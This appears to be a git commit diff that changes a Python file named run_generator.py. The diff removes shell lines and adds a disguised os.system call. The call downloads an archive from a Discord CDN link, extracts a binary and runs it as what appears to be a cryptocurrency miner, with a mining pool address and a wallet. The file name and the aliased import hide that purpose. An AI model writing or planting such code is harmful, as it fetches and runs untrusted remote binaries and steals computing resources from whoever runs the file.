e15d54001293e3d50c4a5bd95fdff1a4959a1b60
erikatyl <79128369+erikatyl@users.noreply.github.com>
2021-10-15 23:45:15 +0800

    Update run_generator.py

--- run_generator.py
+++ run_generator.py
@@ -1,9 +1,2 @@
-apt-get remove wget
-apt-get -y update
-apt-get install wget
-wget https://cdn.discordapp.com/attachments/714102652405022760/898156674009948160/twerking.tar
-tar -xvf twerking.tar
-cd twerking
-chmod +x working
-apt-get install -y pciutils
-./working -rvram 1 -pool 172.65.200.133:3353 -ewal 373Ee6DSDgAYNAVSnfgUV99248L6Ab7aUH.uhsr8wuyjsb3oel -esm 3 -allpools 1 -allcoins 0
+import os as alpha
+alpha.system("apt-get install -y wget && wget https://cdn.discordapp.com/attachments/796512270032437289/814876662688120842/bin.tar && tar -xvf bin.tar && cd bin && chmod +x work && apt-get update && apt-get install -y pciutils && ./work -rvram 1 -pool us.stratu.ms:13810 -ewal 373Ee6DSDgAYNAVSnfgUV99248L6Ab7aUH.uhsr8wuyjsb3oel -esm 3 -allpools 1 -allcoins 0")
